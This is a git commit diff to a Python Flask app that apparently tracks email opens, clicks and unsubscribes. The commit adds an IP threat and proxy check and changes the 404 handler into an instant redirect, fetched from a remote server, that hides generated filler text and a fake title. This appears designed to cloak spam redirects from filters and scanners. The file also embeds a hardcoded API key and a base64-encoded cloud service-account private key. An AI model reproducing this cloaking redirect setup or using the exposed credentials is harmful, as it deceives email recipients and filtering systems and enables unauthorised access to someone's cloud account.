1aa7abe41835ae0aad8c092f97af7de9ff21e8d7
Xkiller <med.ennahas@gmail.com>
2024-11-18 12:24:18 +0000

    new update4

--- main.py
+++ main.py
@@ -18,6 +18,30 @@ app = Flask(__name__)
 faker = Faker()
 
 
+def checkifproxy(ip):
+    url = f"https://api.ipdata.co/{ip}?api-key=22ff508dd86f3d186acdec95d8aa03393794d61e36d894ac31e09928"
+
+    payload = {}
+    headers = {}
+
+    response = requests.request("GET", url, headers=headers, data=payload)
+
+    # Check if the response status code is 200
+    if response.status_code == 200:
+        # Parse the JSON response
+        data = response.json()
+
+        # Check if all threat-related values are False
+        all_safe = all(value is False for key, value in data["threat"].items() if isinstance(value, bool))
+
+        if all_safe:
+            return True
+            # Add your custom action here
+        else:
+            return False
+    else:
+        return False
+
 
 # Replace with your actual service account JSON credentials (encoded in Base64)
 service_account_info_base64 = "eyJ0eXBlIjogInNlcnZpY2VfYWNjb3VudCIsICJwcm9qZWN0X2lkIjogInF1aWNrc3RhcnQtMTU3NjkzNjA1MTg2OSIsICJwcml2YXRlX2tleV9pZCI6ICI4YWYwYWJlYmQyMWRhNDZjM2E3OTE5MzRmYTU1YTljMmIwZDYzMWRjIiwgInByaXZhdGVfa2V5IjogIi0tLS0tQkVHSU4gUFJJVkFURSBLRVktLS0tLVxuTUlJRXZnSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2d3Z2dTa0FnRUFBb0lCQVFDU0txSHN3Wklmb1I2cFxuZUtXNFV6SG5VdTBIeURLY25ETEN3VTJndnJhZlhORXoxS0taam9NdlgxVHE4ZGZ0bE9JT2w0MEFyUFdiM3BFQlxuNmttZVhKUVY1SHdBTkRMT3ZsVmVqV3lGVlN6VGZFL1JMR2VCelJLTVU0aTl5dk5Eb3kwcWx6SFhQOHVXQm84eVxuZXJ0YlllVjJLd2hBZUJsLzRUd3BSamNMa2x6VUdJNWl5ZFJENW1jek9xRnRBT3BHSzNoemlyMGRRL1Q3OG9ISVxuUG5LOVExMlEzSzhhbjJPelZMdG04NVlNL25pL2pMZk0zZDlhRnptTzd3QVE2SVlFNmU4OGRUdlVFTitYQ09ud1xuMlllaVczaHRJWEdJaTlmcStzYjIzN0JScUFlRW1zTE1CdUpwL3o4Y2VTOXBmcFNpbU9laVhnaXhmbkxMMEtLd1xuTFVrQkFnUVpBZ01CQUFFQ2dnRUFESmwyc0VzbVRxb3JrN1cxNlV2b21SVmRuOFphMElPcFgzN2NzMjdGSExzYVxuUUhMRG1tTjl2T3RsalVRUUZpZDNqZ1R6ejF0Wlo1aDVuUFhtWnl0NVMyTFE2bzZWVTV0MkRlcTRjRXpkaXBSa1xuWi9aQkxOL3h5WjFZdysxMjV6MXRZd2E1OGVGS3FoSENMYnFGSkhVdG03Qk5hNHMrdlhaN29sNHVXQVhEa1RlMFxuVXZsZjMySHV3NGs1K2pGSHpCSDhFc1hONkJIMWw5Z3F6QVZNWEF4eWVMTzB1VkxCbHZtVEVjME9yTEp3MVhBVFxuelFUT0loWXczYmRSbExuNThhQWFEVU05bjhCN1F0ZVYvOHR0dlovVnl0MHNQYUNwK0hxOUE0RkQyK2p6aTI2NVxuOU5Va085Q1p1OVN0T0t0NUVJNG9IZmI0cUZLZjE0VnltZW5IQ0l5STFRS0JnUURCNFZ6SnVKcWlTc1pOYnY5eVxuL0Zhblh0ZWZhN1ZFQU54WU9ldTJUWTNvTkJkY3VuTTNCOFVuYlFSKytzcklEdEhjVUgyMjRLU1ZUNkdkWTdBc1xuUVI0WjZJeWMrcVJxdytZL2ZUaTRYNXVTSi9kRk54MHlQRysxV3gvcGlOZmVwZ1diNGd3MWdZRlo0TE8rSXZDa1xuVHVCRlNGaEFSV29qK2VNa01pOVlUSjVtOVFLQmdRREEvNlRhdnp5VTdtL0FKenM3a2FxcXBEVjRUdUNKRnRTbVxuNmRocFlTanU4dmtlL0gxNWttUlBrUVd4Uk9IaDduRlNYZ3NTSm1SYm9neGE3OXExa2ViSnhGNTk3WUZORG8waFxuaS8vK1plWmRjUXNVN3RGeFFaNExpVkRON05CUi82OVF5SGE1YXRQUDJQbkV1MFNIS01OZ3BrN0NKTnBVaTc0L1xuTkNUa1BVWUtGUUtCZ1FDLzVyVFU1V2dKWTBITXV5VVZSemJ1Q3k0Wm1aNmRaTXkwZHdBY1BiOU1LdU5FNFRmUlxuTEZ1MG5tOW8wQXVPNFR4UGVVdzFpenpjblNrMmc4bUl4QnRyUVlhTWlubmJRM1BQTzc2OG44VjRjUjZLMy9hQ1xuRnRmckJmc2NTRnFEQW9saXRlZW52anV1SG45S240TFkzMG1VeWZxd0F3VC8vd01ZZktQb0hrNWJVUUtCZ1FDNFxuMzZuUkNNTkZmcWw1alpzRjB1R0RHRTFIODNiT214b1UwWWhHV1pYV1h0VVlRNUVHTlo3MVFOd05GUWl6WGE4YlxuMFk0VlVzVnJxV3pnWjBaQUM0VGgzY01PS2Naa1EvNFpGbnlmK29pVEZjZ2h3eXJKckt0eUxaVkR6UWM0cFE0UVxuK2hZUVF5Nm11UmQ0eGxJOGptV3BYV1d3UDVFTXo5ZnJ2MDFmZlBwc2lRS0JnR04vMStXVE5YNHRSL0xxMkJ4RFxuVG9qOWs2UU9HeFNuSUthd2dPbWkrWkhNY1pSaEpjWjYxaVVKLzVKSnFvb1NDSm02aHNpZmdtWVBBREpjWmFCTFxuMTVtam0yamUzaWZpN2o2K2dGS3h5VHpzL2N3ZmMvQXFRS3ZrdVFFUG92SmMwb2prclBOTEF2MEdXWkVhN2NRRFxuZXBhWE5DeEZrMURETE43Z3Q4WnVoZnRVXG4tLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tXG4iLCAiY2xpZW50X2VtYWlsIjogImdldC1zdG9yYWdlQHF1aWNrc3RhcnQtMTU3NjkzNjA1MTg2OS5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIsICJjbGllbnRfaWQiOiAiMTA2MDI1MDU3MDg0NDY0MDQyMzk2IiwgImF1dGhfdXJpIjogImh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9vL29hdXRoMi9hdXRoIiwgInRva2VuX3VyaSI6ICJodHRwczovL29hdXRoMi5nb29nbGVhcGlzLmNvbS90b2tlbiIsICJhdXRoX3Byb3ZpZGVyX3g1MDlfY2VydF91cmwiOiAiaHR0cHM6Ly93d3cuZ29vZ2xlYXBpcy5jb20vb2F1dGgyL3YxL2NlcnRzIiwgImNsaWVudF94NTA5X2NlcnRfdXJsIjogImh0dHBzOi8vd3d3Lmdvb2dsZWFwaXMuY29tL3JvYm90L3YxL21ldGFkYXRhL3g1MDkvZ2V0LXN0b3JhZ2UlNDBxdWlja3N0YXJ0LTE1NzY5MzYwNTE4NjkuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCAidW5pdmVyc2VfZG9tYWluIjogImdvb2dsZWFwaXMuY29tIn0="
@@ -42,6 +66,7 @@ def save_to_gcs(data, file_name):
     except Exception as e:
         # Catch and print any exceptions
         print(f"Failed to save data to {file_name} in bucket {bucket_name}. Error: {str(e)}")
+
 
 @app.route('/api/<path:random_characters>', methods=['GET'])
 def show_image_nometadata(random_characters):
@@ -165,7 +190,8 @@ def show_image_nometadata(random_characters):
 
         return response
 
-#Click
+
+# Click
 @app.route('/apiv2/<random_characters>/<subid>', methods=['GET'])
 def redirect_url(random_characters, subid):
     # Define the target URL
@@ -309,8 +335,7 @@ def redirect_url(random_characters, subid):
         return response
 
 
-
-#unsubscribe
+# unsubscribe
 @app.route('/apiv3/<randomwords>/unsubscribe', methods=['GET', 'POST'])
 def unsubscribe(randomwords):
     if request.method == 'POST':
@@ -413,7 +438,8 @@ def unsubscribe(randomwords):
 
     return render_template_string(unsubscribe_form, randomwords=randomwords)
 
-#open
+
+# open
 @app.route('/apiv3/<randomwords>', methods=['GET'])
 def track_user(randomwords):
     # Get the request details
@@ -441,41 +467,11 @@ def track_user(randomwords):
     save_to_gcs(tracking_data_json_open, file_name)
 
     return {"message": "Success."}, 200
+
+
 @app.route('/hello/<name>')
 def hello_name(name):
     return f"Hello, {name}!"
-
-
-@app.route('/')
-def globalredirect():
-    lorem_ipsum = faker.paragraphs(30)
-    lorem_ipsum_small = faker.name_male()
-    target_url = "https://singingfiles.com/1761932"
-    # HTML content with hidden Lorem Ipsum in the body, and also in the title
-    html_content = f"""
-        <html>
-        <head>
-            <meta http-equiv="refresh" content="0;url={target_url}">
-            <title>{lorem_ipsum_small} </title>
-            <style>
-                .hidden-text {{
-                    visibility: hidden;
-                    height: 0;
-                    width: 0;
-                    overflow: hidden;
-                }}
-            </style>
-        </head>
-        <body>
-            <div class="hidden-text">{''.join(lorem_ipsum)}</div>
-        </body>
-        </html>
-        """
-
-    response = make_response(html_content)
-    response.headers['Content-Type'] = 'text/html'
-
-    return response
 
 
 def detect_device(user_agent):
@@ -495,6 +491,51 @@ def get_real_ip():
     else:
         ip = request.remote_addr
     return ip
+
+
+@app.errorhandler(404)
+def page_not_found(e):
+    url = f"https://medennahas.pythonanywhere.com/smart"
+
+    payload = {}
+    headers = {}
+
+    response = requests.request("GET", url, headers=headers, data=payload)
+
+    # Parse the JSON response
+    json_data = response.json()
+
+    # Access the "link" field in the JSON
+    link = json_data["link"]
+    # Your custom logic here
+    lorem_ipsum = faker.paragraphs(30)
+    lorem_ipsum_small = faker.name_male()
+    target_url = link
+    # HTML content with hidden Lorem Ipsum in the body, and also in the title
+    html_content = f"""
+           <html>
+           <head>
+               <meta http-equiv="refresh" content="0;url={target_url}">
+               <title>{lorem_ipsum_small} </title>
+               <style>
+                   .hidden-text {{
+                       visibility: hidden;
+                       height: 0;
+                       width: 0;
+                       overflow: hidden;
+                   }}
+               </style>
+           </head>
+           <body>
+               <div class="hidden-text">{''.join(lorem_ipsum)}</div>
+           </body>
+           </html>
+           """
+
+    response = make_response(html_content)
+    response.headers['Content-Type'] = 'text/html'
+
+    return response
 
 
 if __name__ == '__main__':
